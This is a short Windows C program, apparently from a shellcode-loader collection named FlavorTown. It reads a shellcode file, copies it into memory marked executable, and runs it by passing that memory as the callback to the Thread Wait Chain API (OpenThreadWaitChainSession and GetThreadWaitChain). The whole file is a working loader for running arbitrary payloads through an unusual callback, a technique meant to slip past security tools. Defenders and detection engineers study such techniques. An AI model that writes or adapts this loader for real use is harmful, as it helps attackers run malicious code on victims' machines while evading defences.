// Wra7h/FlavorTown
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Advapi32.lib")

#include <stdio.h>
#include <windows.h>
#include <wct.h>
#include <processthreadsapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;
	PVOID hAlloc = NULL;

	HWCT hWCT = NULL;
	DWORD cNode = 1;
	BOOL bIsCycle = FALSE;
	WAITCHAIN_NODE_INFO SWNI = { 0 };

	if (argc != 2)
	{
		printf("Usage: GetThreadWaitChain.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	hWCT = OpenThreadWaitChainSession(WCT_ASYNC_OPEN_FLAG, (PWAITCHAINCALLBACK) hAlloc);

	if (!hWCT)
		goto CLEANUP;

	GetThreadWaitChain(hWCT, NULL, 0, GetCurrentThreadId(), &cNode, &SWNI, &bIsCycle);
	
	CloseThreadWaitChainSession(hWCT);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}